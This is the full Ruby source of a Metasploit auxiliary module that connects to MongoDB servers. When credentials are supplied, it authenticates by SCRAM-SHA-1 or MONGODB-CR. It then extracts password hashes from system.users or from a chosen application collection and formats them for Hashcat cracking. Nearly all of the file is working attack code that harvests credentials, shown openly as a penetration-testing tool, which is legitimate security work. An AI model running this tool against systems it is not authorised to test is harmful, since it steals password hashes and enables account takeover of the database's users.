##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'bson'
require 'openssl'
require 'digest'
require 'stringio'
require 'base64'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MongoDB Hash Extractor',
        'Description' => %q{
          This module extracts password hashes from a MongoDB instance and stores
          them in the database for later cracking. By default, it dumps system user
          credentials from the 'system.users' collection. Alternatively,
          it can dump application user hashes from a specified collection.

          Use Hashcat mode 24100 for SCRAM-SHA-1 and 24200 for SCRAM-SHA-256
          Successfully tested against MongoDB 3.6 with and without authentication
        },
        'References' => [
          [ 'URL', 'https://docs.mongodb.com/manual/reference/mongodb-wire-protocol/' ],
          [ 'URL', 'https://github.com/mongodb/specifications/blob/master/source/auth/auth.rst/' ],
          [ 'URL', 'https://hashcat.net/wiki/doku.php?id=example_hashes' ]
        ],
        'Author' => [
          'h00die',
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Reliability' => [UNKNOWN_RELIABILITY],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(27017),
        OptString.new('DB', [ true, 'Database to query', 'admin']),
        OptString.new('COLLECTION', [ false, 'Custom collection to dump (if empty, dumps system.users)', '']),
        OptString.new('USER_FIELD', [ false, 'Username field name for custom collection', 'username']),
        OptString.new('HASH_FIELD', [ false, 'Hash field name for custom collection', 'hash']),
        OptString.new('USERNAME', [ false, 'Username for authentication if required', '']),
        OptString.new('PASSWORD', [ false, 'Password for authentication if required', ''])
      ]
    )
  end

  def run_host(ip)
    print_status("Connecting to #{ip}...")
    begin
      connect

      if require_auth?
        user = datastore['USERNAME']
        pass = datastore['PASSWORD']
        if user.blank? || pass.blank?
          print_error('Authentication required but no USERNAME/PASSWORD provided')
          return
        end

        print_status("Authentication required, attempting login as '#{user}'...")
        if do_login(user, pass) != :success
          print_error('Login failed')
          return
        end
        print_good('Successfully authenticated')
      else
        print_good('No authentication required')
      end

      if datastore['COLLECTION'].blank?
        dump_system_users
      else
        dump_app_users
      end
    rescue StandardError => e
      print_error("Unable to connect: #{e}")
    ensure
      disconnect
    end
  end

  def dump_system_users
    db = datastore['DB']
    print_status("Dumping MongoDB system users from #{db}.system.users...")

    cmd = BSON::Document.new({})
    pkt = build_query_packet("#{db}.system.users", cmd.to_bson.to_s)

    sock.put(pkt)
    resp = sock.get_once(-1, 10)

    docs = parse_docs(resp)

    if docs.empty?
      print_warning('No users found or unable to parse')
      return
    end

    tbl = Rex::Text::Table.new(
      'Header' => 'MongoDB System Hashes',
      'Columns' => ['Type', 'Username', 'Hash']
    )

    service_data = {
      address: ::Rex::Socket.getaddress(rhost, true),
      port: rport,
      service_name: 'mongodb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    docs.each do |doc|
      user = doc['user']
      creds = doc['credentials'] || {}

      # SCRAM-SHA-1 (Hashcat 24100)
      if creds['SCRAM-SHA-1']
        s1 = creds['SCRAM-SHA-1']
        b64_user = Base64.strict_encode64(user)
        hash = "$mongodb-scram$*0*#{b64_user}*#{s1['iterationCount']}*#{s1['salt']}*#{s1['serverKey']}"
        tbl << ['db (SCRAM-SHA-1)', user, hash]

        store_hash_credential(service_data, user, hash, 'mongodb-scram-sha1')
      end

      # SCRAM-SHA-256 (Hashcat 24200)
      if creds['SCRAM-SHA-256']
        s256 = creds['SCRAM-SHA-256']
        b64_user = Base64.strict_encode64(user)
        hash = "$mongodb-scram$*1*#{b64_user}*#{s256['iterationCount']}*#{s256['salt']}*#{s256['serverKey']}"
        tbl << ['db (SCRAM-SHA-256)', user, hash]

        store_hash_credential(service_data, user, hash, 'mongodb-scram-sha256')
      end

      # MONGODB-CR Legacy (Plain MD5)
      next unless doc['pwd'] && !creds.key?('SCRAM-SHA-1') && !creds.key?('SCRAM-SHA-256')

      hash = doc['pwd']
      tbl << ['db (MONGODB-CR)', user, hash]

      store_hash_credential(service_data, user, hash, 'md5')
    end

    print_good("\n#{tbl}")
  end

  def dump_app_users
    coll = datastore['COLLECTION']
    user_field = datastore['USER_FIELD']
    hash_field = datastore['HASH_FIELD']
    db = datastore['DB']

    print_status("Dumping app hashes from #{db}.#{coll} (Field: #{user_field}:#{hash_field})...")

    cmd = BSON::Document.new({
      hash_field => { '$exists' => true, '$ne' => '' }
    })
    pkt = build_query_packet("#{db}.#{coll}", cmd.to_bson.to_s)

    sock.put(pkt)
    resp = sock.get_once(-1, 10)

    docs = parse_docs(resp)

    if docs.empty?
      print_warning('No users found or unable to parse')
      return
    end

    tbl = Rex::Text::Table.new(
      'Header' => 'MongoDB Application Hashes',
      'Columns' => ['Type', 'Username', 'Hash']
    )

    service_data = {
      address: ::Rex::Socket.getaddress(rhost, true),
      port: rport,
      service_name: 'mongodb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    docs.each do |doc|
      user = doc[user_field].to_s
      hash = doc[hash_field].to_s

      next if user.blank? || hash.blank?

      tbl << ['app', user, hash]

      store_hash_credential(service_data, user, hash)
    end

    print_good("\n#{tbl}")
  end

  def store_hash_credential(service_data, username, hash, jtr_format = nil)
    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: username,
      private_data: hash,
      private_type: :nonreplayable_hash
    }
    credential_data[:jtr_format] = jtr_format if jtr_format
    credential_data.merge!(service_data)

    create_credential(credential_data)
  end

  def do_login(user, password)
    vprint_status("Trying user: #{user}, password: #{password}")

    scram_status = auth_scram_sha1(user, password)
    return :success if scram_status == :next_user

    vprint_status('SCRAM-SHA-1 not accepted or failed; trying MONGODB-CR fallback...')
    nonce = get_nonce
    if nonce.present?
      cr_status = auth_cr(user, password, nonce)
      return :success if cr_status == :next_user
    end

    nil
  end

  def auth_scram_sha1(user, password)
    db = datastore['DB']
    digest_pass = Digest::MD5.hexdigest("#{user}:mongo:#{password}")

    client_nonce = Rex::Text.rand_text_alphanumeric(24)
    auth_payload = "n=#{user},r=#{client_nonce}"
    client_first_bare = auth_payload
    client_first_message = "n,,#{auth_payload}"

    sasl_start_cmd = BSON::Document.new({
      'saslStart' => BSON::Int32.new(1),
      'mechanism' => 'SCRAM-SHA-1',
      'payload' => BSON::Binary.new(client_first_message)
    })

    pkt = build_cmd_packet("#{db}.$cmd", sasl_start_cmd.to_bson.to_s)
    sock.put(pkt)
    resp = sock.get_once(-1, 5)

    return nil unless resp && resp.length > 36

    reply = parse_doc(resp)
    return nil unless reply && reply['ok'].to_i == 1

    conversation_id = reply['conversationId']
    server_payload = reply['payload'].data
    server_vars = parse_scram_payload(server_payload)

    server_nonce = server_vars['r']
    salt = Rex::Text.decode_base64(server_vars['s'])
    iterations = server_vars['i'].to_i

    salted_password = OpenSSL::PKCS5.pbkdf2_hmac(
      digest_pass,
      salt,
      iterations,
      20,
      OpenSSL::Digest.new('SHA1')
    )

    client_key = OpenSSL::HMAC.digest('sha1', salted_password, 'Client Key')
    stored_key = OpenSSL::Digest::SHA1.digest(client_key)
    client_final_without_proof = "c=biws,r=#{server_nonce}"
    auth_message = "#{client_first_bare},#{server_payload},#{client_final_without_proof}"

    client_signature = OpenSSL::HMAC.digest('sha1', stored_key, auth_message)
    client_proof = Rex::Text.xor(client_key, client_signature)
    client_final_message = "#{client_final_without_proof},p=#{Rex::Text.encode_base64(client_proof)}"

    conv_id_bson = conversation_id.is_a?(Integer) ? BSON::Int32.new(conversation_id) : conversation_id

    sasl_continue_cmd = BSON::Document.new({
      'saslContinue' => BSON::Int32.new(1),
      'conversationId' => conv_id_bson,
      'payload' => BSON::Binary.new(client_final_message)
    })

    pkt = build_cmd_packet("#{db}.$cmd", sasl_continue_cmd.to_bson.to_s)
    sock.put(pkt)
    resp = sock.get_once(-1, 5)

    return nil unless resp && resp.length > 36

    reply = parse_doc(resp)
    if reply && reply['ok'].to_i == 1
      print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}' (SCRAM-SHA-1)")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'mongodb',
        user: user,
        password: password,
        proof: reply.inspect
      )
      return :next_user
    end

    nil
  rescue StandardError => e
    vprint_error("SCRAM-SHA-1 exception: #{e.message}")
    nil
  end

  def auth_cr(user, password, nonce)
    db = datastore['DB']
    key = Rex::Text.md5(nonce + user + Rex::Text.md5("#{user}:mongo:#{password}"))

    cmd = BSON::Document.new({
      'authenticate' => BSON::Int32.new(1),
      'user' => user,
      'nonce' => nonce,
      'key' => key
    })

    packet = build_cmd_packet("#{db}.$cmd", cmd.to_bson.to_s)
    sock.put(packet)
    response = sock.get_once(-1, 5)

    return nil unless response && response.length > 36

    reply = parse_doc(response)
    if reply && reply['ok'].to_i == 1
      print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}' (MONGODB-CR)")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'mongodb',
        user: user,
        password: password,
        proof: reply.inspect
      )
      return :next_user
    end

    nil
  rescue StandardError => e
    vprint_error("MONGODB-CR exception: #{e.message}")
    nil
  end

  def parse_scram_payload(payload)
    payload.split(',').each_with_object({}) do |var, hash|
      k, v = var.split('=', 2)
      hash[k] = v if k && v
    end
  end

  def parse_doc(response)
    return nil if response.nil? || response.length <= 36

    buffer = BSON::ByteBuffer.new(response[36..])
    BSON::Document.from_bson(buffer)
  rescue StandardError
    nil
  end

  def parse_docs(response)
    return [] if response.nil? || response.length <= 36

    number_returned = response[32, 4].unpack('V')[0]

    docs = []
    data = response[36..]

    return [] if data.nil? || data.empty?

    buffer = StringIO.new(data)

    number_returned.times do
      break if buffer.eof?

      begin
        len_bytes = buffer.read(4)
        break if len_bytes.nil? || len_bytes.length < 4

        doc_len = len_bytes.unpack('V')[0]
        break if doc_len.nil? || doc_len < 5

        remaining = data.length - buffer.pos + 4
        break if doc_len > remaining

        buffer.pos -= 4
        doc_bytes = buffer.read(doc_len)
        break if doc_bytes.nil? || doc_bytes.length < doc_len

        doc_buf = BSON::ByteBuffer.new(doc_bytes)
        docs << BSON::Document.from_bson(doc_buf)
      rescue StandardError => e
        vprint_error("BSON parse error in multi-doc: #{e.message}")
        break
      end
    end

    docs
  rescue StandardError => e
    vprint_error("Parse docs error: #{e.message}")
    []
  end

  def build_cmd_packet(coll_name, bson_payload)
    coll_str = "#{coll_name}\x00"
    req_id = Rex::Text.rand_text(4)
    msg_len = 16 + 4 + coll_str.length + 4 + 4 + bson_payload.length

    packet = [msg_len].pack('V')
    packet << req_id # requestID (4 bytes) - Client-generated random ID to match the response
    packet << "\x00\x00\x00\x00"   # responseTo (4 bytes) - Always 0 for a client request
    packet << "\xd4\x07\x00\x00"   # opCode (4 bytes) - 2004 (0x000007D4 in little-endian) which is OP_QUERY
    # --- End of standard 16-byte MongoDB Header ---

    packet << "\x00\x00\x00\x00" # flags (4 bytes) - 0 means standard query (no special flags like TailableCursor or SlaveOk)
    packet << coll_str # fullCollectionName (C-string) - The namespace (e.g., "admin.$cmd\0")
    packet << "\x00\x00\x00\x00"   # numberToSkip (4 bytes) - 0 means don't skip any results
    packet << "\x01\x00\x00\x00"   # numberToReturn (4 bytes) - 1 means return only the first document (standard for $cmd commands)
    packet << bson_payload # query (BSON document) - The actual command/query to execute
    packet
  end

  def build_query_packet(coll_name, bson_payload)
    coll_str = "#{coll_name}\x00"
    req_id = Rex::Text.rand_text(4)
    msg_len = 16 + 4 + coll_str.length + 4 + 4 + bson_payload.length

    packet = [msg_len].pack('V')
    packet << req_id
    packet << "\x00\x00\x00\x00"
    packet << "\xd4\x07\x00\x00"
    packet << "\x00\x00\x00\x00"
    packet << coll_str
    packet << "\x00\x00\x00\x00"
    packet << [-1].pack('V')
    packet << bson_payload
    packet
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def get_nonce
    cmd = BSON::Document.new({ 'getnonce' => BSON::Int32.new(1) })
    pkt = build_cmd_packet("#{datastore['DB']}.$cmd", cmd.to_bson.to_s)

    sock.put(pkt)
    response = sock.get_once(-1, 5)
    return '' unless response && response.length > 36

    doc = parse_doc(response)
    doc && doc['ok'].to_i == 1 ? doc['nonce'].to_s : ''
  end

  def require_auth?
    cmd = BSON::Document.new({ 'listDatabases' => BSON::Int32.new(1) })
    list_db_pkt = build_cmd_packet('admin.$cmd', cmd.to_bson.to_s)

    sock.put(list_db_pkt)
    auth_resp = sock.get_once(-1, 5)

    have_auth_error?(auth_resp)
  end

  def have_auth_error?(response)
    return true if response.nil? || response.length <= 36

    doc = parse_doc(response)
    if doc
      return true if doc['ok'].to_i == 0 || doc['errmsg']
    else
      documents = response[36..]
      return documents.include?('errmsg') || documents.include?('unauthorized') || documents.include?('requires authentication')
    end

    false
  end
end
